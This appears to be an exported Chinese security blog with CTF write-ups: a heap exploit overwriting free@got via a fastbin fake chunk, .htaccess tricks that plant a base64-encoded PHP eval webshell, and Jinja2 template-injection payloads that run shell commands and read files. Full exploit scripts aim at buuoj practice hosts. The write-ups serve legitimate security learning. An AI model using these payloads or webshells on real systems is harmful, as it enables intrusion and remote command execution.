<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252033517.png" alt="image-20240708182417742" style="zoom: 67%;" />

<h4 id="构造fake-chunk加入fastbins"><a href="#构造fake-chunk加入fastbins" class="headerlink" title="构造fake_chunk加入fastbins"></a>构造<em>fake_chunk</em>加入<em>fastbins</em></h4><p>​	我们需要在<em>heaparray</em>的地址前面找到一个合适的地址，来错位偏移构造一个<em>size</em>为<code>0x7f</code>的<em>fake_chunk</em>，如图，以<code>0x6020ad</code>为<em>fake_chunk</em>的首地址。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032487.png" alt="image-20240709105407483" style="zoom:80%;" />

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032407.png" alt="image-20240709105625469"></p>
<p>​	然后将<em>fake_chunk</em>添加到<em>fastbins</em>中，也就是让<em>fastbin_chunk0</em>的<em>fd</em>指针指向<code>0x6020ad</code>这个地址。通过<em>chunk1</em>溢出，然后覆盖<em>fastbins_chunk0</em>的<em>fd</em>指针为<code>0x6020ad</code>即可。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032705.png" alt="image-20240708185805628" style="zoom: 67%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x60</span>-<span class="number">0x8</span>)+<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020ad</span>)</span><br><span class="line"><span class="comment">#b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;A&#x27;*(0x60-0x8)填充chunk1</span></span><br><span class="line"><span class="comment">#b&#x27;B&#x27;*0x8填充fastbins_chunk0的前8个字节</span></span><br><span class="line"><span class="comment">#p64(0x71)是使后面释放fastbins_chunk0成chunk2后的size不变</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>

<h4 id="写free-got到heaparray-0"><a href="#写free-got到heaparray-0" class="headerlink" title="写free_got到heaparray[0]"></a>写<em>free_got</em>到<em>heaparray[0]</em></h4><p>​	把<code>free_got</code>写到<code>heaparray[0]</code>，这样后面修改<em>chunk0</em>的值为<em>system_plt</em>，其实就是修改<em>free@got</em>表的值为<em>sysytm_plt</em>，那么怎么写呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;eeee&quot;</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment">#第一次创建的堆块的是fastbins_chunk0，即fastbin中地址为0x1d000e0的chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x20</span>)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#因为fastbins_chunk0的fd指针是0x6020ad，所以第二次创建的chunk的起始地址是0x6020ad</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x23</span>+p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>

<p>​	先再创建两个<em>chunk</em>，第一个就是释放后的<em>fastbins_chunk0</em>，即<em>fastbin</em>中地址为<code>0x1d000e0</code>的<em>chunk</em>。然后我其实在_heap_中只看到<code>3</code>个<em>chunk</em>，一直不知道<em>chunk3</em>去哪儿了。（其实<em>chunk3</em>就是前面构造的<em>fake_chunk</em>）</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032826.png" alt="image-20240709103039101" style="zoom:67%;" />

<p>​	后来想到前面<em>fastbin</em>中的<em>fastbins_chunk0</em>的<em>fd</em>指针指向的是<code>0x6020ad</code>，所以就看了这个地址，里面果然是<em>chunk3</em>的数据，也就是说<em>chunk3</em>就是前面构造的<em>fake_chunk</em>。如图可以看到写入的<code>0x20*&quot;f&quot;</code>：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032488.png" alt="image-20240709102425216" style="zoom:80%;" />

<p>​	而<code>0x6020ad</code>后面正好是数组<em>heaprray</em>的地址<code>0x6020e0</code>，也就是说我们可以通过堆溢出填充<em>chunk3</em>到<em>heaprray[0]<em>，并修改</em>heaprray[0]<em>的值。（这也是为什么前面要在</em>heaparray</em>的地址前面找合适的地址来构造<em>fake_chunk</em>了）</p>
<h4 id="写system-plt到free-got"><a href="#写system-plt到free-got" class="headerlink" title="写system_plt到free_got"></a>写<em>system_plt</em>到<em>free_got</em></h4><p>​	现在，<code>heaparray[0]</code>的值是<code>free_got</code>，我们直接修改<em>chunk0</em>的内容为<code>system_plt</code>。然后再<code>delete(1)</code><em>call</em>  <em>free</em>的时候，调用的其实是system函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(elf.plt[<span class="string">&quot;system&quot;</span>])<span class="comment">#修改free@got表为system的地址，后面再call free的时候，调用的其实是system函数</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25585</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x400cdc</span>,<span class="number">0x400ce8</span>,<span class="number">0x400cf4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x60</span>-<span class="number">0x8</span>)+<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020ad</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;e&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x23</span>+p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(elf.plt[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	如果想覆盖任意地址的数据，那么可以在任意地址或其前面构造一个<code>fake_chunk</code>，然后使<code>fastbins</code>中的<code>fd</code>指针指向这个<code>fake_chunk</code>的首地址（可以通过堆溢出），我们便能通过从<code>fastbins</code>获取<code>chunk</code>的方式来改写任意地址里的数据。</p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>htaccess文件的相关使用</title>
    <url>/2025/01/19/htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>基于 <code>.htaccess</code> 文件的强大配置功能，本文将介绍其常见的使用方式，包括自定义错误页面、文件类型处理以及如何通过巧妙配置实现安全漏洞利用。</p>
<span id="more"></span>

<p><span style="color:blue;">注意：</span><strong>.htaccess中有 # 单行注释，且支持 \ 拼接上下两行。</strong></p>
<h2 id="启动-htaccess文件的使用"><a href="#启动-htaccess文件的使用" class="headerlink" title="启动.htaccess文件的使用"></a>启动.htaccess文件的使用</h2><p>Apache中修改配置文件httpd.conf，找到有关控制.htaccess文件的指令AllowOverride，进行如下设置：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">AllowOverride <span class="keyword">All</span></span><br></pre></td></tr></table></figure>

<h2 id="常见使用方式"><a href="#常见使用方式" class="headerlink" title="常见使用方式"></a>常见使用方式</h2><h3 id="自定义错误页面"><a href="#自定义错误页面" class="headerlink" title="自定义错误页面"></a><span style="color:blue;">自定义错误页面</span></h3><p>Apache主配置文件中修改<code>&lt;Directory&gt;</code>指令块。</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">用于定义特定目录的配置，确保<span class="keyword">Require</span> <span class="literal">all</span> granted允许所有用户访问</span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">    Options +Indexes +FollowSymLinks +ExecCGI</span><br><span class="line">    AllowOverride <span class="literal">All</span></span><br><span class="line">    <span class="keyword">Order</span> allow,deny</span><br><span class="line">    Allow from <span class="literal">all</span></span><br><span class="line">    <span class="keyword">Require</span> <span class="literal">all</span> granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<p>语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ErrorDocument 401 /error/401.php</span><br><span class="line">ErrorDocument 403 /error/403.php</span><br><span class="line">ErrorDocument 404 /error/404.php</span><br><span class="line">ErrorDocument 500 /error/500.php</span><br></pre></td></tr></table></figure>

<h3 id="Handler和Type"><a href="#Handler和Type" class="headerlink" title="Handler和Type"></a><span style="color:blue;">Handler和Type</span></h3><p><code>MIME</code>类型可以帮助服务器和客户端识别文件的类型，而不仅仅依赖文件扩展名。<code>application/x-httpd-php</code>是一个特定的处理器名称，表示将这些文件交给PHP模块处理。</p>
<p><code>ForceType</code>指令用于<strong>强制指定文件的MIME类型</strong>。<code>SetHandler</code>指令用于为匹配的文件<strong>指定一个处理器</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;exp.jpg&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">#&lt;FilesMatch&gt; 是一个指令块，用于对匹配特定模式的文件应用配置指令。</span><br><span class="line">    #参数 &quot;exp.jpg&quot; 是一个正则表达式，用于匹配文件名。在这里，它匹配文件名正好为 exp.jpg 的文件。</span><br></pre></td></tr></table></figure>

<p><code>AddType</code>指令用于将<strong>特定的MIME类型</strong>与<strong>文件扩展名</strong>关联起来。<code>AddHandler</code>用于将<strong>处理器</strong>与<strong>文件扩展名</strong>关联起来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jt</span><br><span class="line">#拓展名为.jt的文件也可以执行php代码</span><br><span class="line">AddHandler cgi-script .hhh</span><br><span class="line">#拓展名为.hhh的文件作为CGI脚本来处理</span><br></pre></td></tr></table></figure>

<h3 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a><span style="color:blue;">php_value</span></h3><p>在主文件解析前后，自动将指定文件当作php文件解析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file 1.txt   在主文件解析前，自动解析1.txt的内容</span><br><span class="line">php_value auto_append_file 1.txt    在主文件解析后，自动解析1.txt的内容</span><br></pre></td></tr></table></figure>

<p>当前目录下有php文件时，.htaccess把自己指定当作php文件处理：(# 是.htaccess中的单行注释)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>参考文章：<a href="https://blog.51cto.com/u_15847702/5821101">https://blog.51cto.com/u_15847702&#x2F;5821101</a></p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF2020]easyphp">(羊城杯2020)easyphp</a></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 将./下不是index.php的文件删除</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># 将./下不是index.php的文件删除</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>思路：</p>
<p>​	<strong>因为index.php会将所有不是index.php的文件都删除，所以这里要想到利用.htaccess的php_value auto_prepend_file来攻击，其可以使任意file在主文件即index.php解析前被当作php文件解析。</strong></p>
<p>要利用的poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line">#&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li>content过滤了file，解决思路：可以将file写成fil%0Ae，使fil在上一行，e在下一行，再利用 \ 连接上下两行，如fil%0Ae即可。</li>
<li>在content后添加<code>\nHello, world</code>不符合.htaccess格式，解决思路：在末尾加一个 \ 将后加的\n给转义掉。</li>
</ol>
<p>最后payload如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?content=php_value auto_prepend_fil\%<span class="number">0</span>Ae .htaccess%<span class="number">0</span>A%<span class="number">23</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /&#x27;</span>);<span class="meta">?&gt;</span>\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>

<p>题目：<a href="https://buuoj.cn/challenges#[SUCTF%202019]EasyWeb">SUCTF 2019EasyWeb</a></p>
<p>源码：</p>
<p>怎么让<code>.htaccess</code>文件被当作图片呢？</p>
<p>法一：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">在文件前加</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> width 1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> height 1337</span></span><br></pre></td></tr></table></figure>

<p>法二：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">在.htaccess前添加<span class="keyword">x</span><span class="number">00</span><span class="keyword">x</span><span class="number">00</span><span class="keyword">x</span><span class="number">8</span>ax<span class="number">39</span><span class="keyword">x</span><span class="number">8</span>ax<span class="number">39</span>(要在十六进制编辑器中添加，或者使用python的bytes类型)</span><br><span class="line"><span class="keyword">x</span><span class="number">00</span><span class="keyword">x</span><span class="number">00</span><span class="keyword">x</span><span class="number">8</span>ax<span class="number">39</span><span class="keyword">x</span><span class="number">8</span>ax<span class="number">39</span> 是wbmp文件的文件头</span><br><span class="line">.htaccess中以<span class="number">0x00</span>开头的同样也是注释符，所以不会影响.htaccess</span><br></pre></td></tr></table></figure>

<p>由于文件内容过滤了<code>&lt;?</code>，我们就不能写php代码了，可以将马进行<code>base64</code>编码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a12		</span><br><span class="line"><span class="comment">#12是为了补足8个字节，满足base64编码的规则</span></span><br><span class="line">PD9waHAgZXZhbCgkX1JFUVVFU1RbJ3NoJ10pOz8+</span><br><span class="line"><span class="comment">//&lt;?php eval($_REQUEST[&#x27;sh&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然我们还需要对<code>base64</code>编码的马进行解码，可以利用伪协议<code>php://filter</code>将<code>1.jt</code>文件进行<code>base64</code>解码，利用<code>auto_append_file</code>来包含解码后的文件<code>1.jt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application/x-httpd-php .jt</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./1.jt</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Htaccess</span>(<span class="params">url,data</span>):</span><br><span class="line">    htaccess = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jt</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./1.jt&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;.htaccess&quot;</span>,htaccess,<span class="string">&quot;image/jpeg&quot;</span>)&#125;</span><br><span class="line">    res = requests.post(url=url,data=data,files=files)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Shell</span>(<span class="params">url,data</span>):</span><br><span class="line">    shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;sh&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;1.jt&quot;</span>,shell,<span class="string">&quot;image/jpeg&quot;</span>)&#125;</span><br><span class="line">    res = requests.post(url=url,data=data,files=files)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://a7c9df93-30ed-44c8-ba5b-3287d8f220b6.node5.buuoj.cn:81/&#x27;</span>+payload</span><br><span class="line">    post_data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">    Htaccess(url,post_data)</span><br><span class="line">    Shell(url,post_data)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>jinja2模板注入总结</title>
    <url>/2024/12/18/jinja2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>Jinja2模板注入是一种安全漏洞，发生在使用Jinja2模板引擎的Web应用程序中。当应用程序将用户输入直接嵌入到模板渲染过程中，且未对输入进行适当的过滤或验证时，攻击者可以注入恶意的模板代码。这些恶意代码可能会被Jinja2引擎执行，从而导致未经授权的操作，例如读取服务器文件、执行系统命令或窃取敏感信息。这种漏洞类似于传统的代码注入攻击，但针对的是模板引擎的语法和功能。</p>
<span id="more"></span>

<h2 id="相关函数总结"><a href="#相关函数总结" class="headerlink" title="相关函数总结"></a>相关函数总结</h2><p>listdir(“&#x2F;“)函数列出目录文件</p>
<p>open(“flag”,”r”).read()打开文件并读取</p>
<p>eval将字符串作为代码执行</p>
<h3 id="两个内置函数"><a href="#两个内置函数" class="headerlink" title="两个内置函数"></a>两个内置函数</h3><p>get_flashed_messages、url_for</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print(get_flashed_messages.__globals__.os[&quot;pop&quot;+&quot;en&quot;](&quot;ls&quot;).read())%&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h2><ol>
<li><p><code>[&#39;__xxx__&#39;]</code>和<code>.__xxx__</code>其实没有区别，但是<code>[&#39;__xxx__&#39;]</code>可以通过拼接字符串的方式，绕过对xxx字符的过滤。还有<code>[&#39;xxx&#39;]</code>和<code>.xxx</code>。</p>
</li>
<li>查看配置文件，作为存储配置信息的变量`config`，这个类中的`__init__`函数全局变量中已经导入了`os`模块，我们可以直接调用。
</li>
<li><p>**_<em>getattribute</em>_()**函数可以拼接两个字符串，可将__init__写成<code>__getattribute__(&#39;__in&#39;+&#39;it__&#39;)</code>。</p>
</li>
<li><pre><code class="jinja2">&#123;&#123;config.__init__.__globals__.os.popen('env').read()&#125;&#125;
&#123;&#123;config.__getattribute__('__in'+'it__').__globals__.os.popen('ls').read()&#125;&#125;
&#123;&#123;a.__init__.__globals__['__builtins__'].eval('__import__("os").popen("env").read')&#125;&#125;
&#123;&#123;b.__getattribute__('__in'+'it__').__globals__.__builtins__['__import__']('os').popen('ls').read()&#125;&#125;
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 对config做了限制</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. 得到object类</span><br><span class="line"></span><br><span class="line">&gt; `[].__class__`：这会获取空列表（`[]`）的类，即 `list`。</span><br><span class="line">&gt;</span><br><span class="line">&gt; `__base__`：在Python <span class="number">3</span>中，这是获取对象的基类（即直接父类）的特殊属性。然而，`list` 的基类是 `object`，因为所有新式类都隐式继承自 `object`。</span><br><span class="line"></span><br><span class="line">```jinja2</span><br><span class="line">&#123;&#123;[].__class__.__base__&#125;&#125;</span><br><span class="line">&#123;# 过滤了class可以用下面这个，拼接字符串 #&#125;</span><br><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;# 多少个__bases__[<span class="number">0</span>]自己试 #&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>利用<code>__subclasses__</code>去访问<code>object</code>类下的所有子类</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">&#123;&#123;session[&#x27;__class__&#x27;].__bases__[0].__bases__[0].__subclasses__()&#125;&#125;</span><br><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>常见可利用的类：**&lt;class ‘os._wrap_close’&gt;<strong>，</strong>&lt;class ‘warnings.catch_warnings’&gt;<strong>，</strong>&lt;class ‘site._Printer’&gt;**</p>
<ul>
<li>**&lt;type ‘file’&gt;**，对文件操作的类，可以用来读取文件。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>确定一些类中是否含<code>os</code>模块、<code>__builtins__</code>模块</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;#查看71类下有什么#&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;#查看__builtins__模块下有什么#&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__.__builtins__&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>含<code>os</code>模块，直接利用<code>os</code>中的<code>popen</code>函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;#利用popen函数查看目录，读取文件#&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>不含<code>os</code>模块，如果含<code>__builtins__</code>模块，利用该模块下的<code>eval</code>函数导入<code>os</code>模块</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;#利用 eval函数执行命令#&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;xxx.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="for循环遍历匹配"><a href="#for循环遍历匹配" class="headerlink" title="for循环遍历匹配"></a><code>for</code>循环遍历匹配</h3><p>遍历<code>object</code>类下的所有子类，匹配<code>catch_warnings</code>类</p>
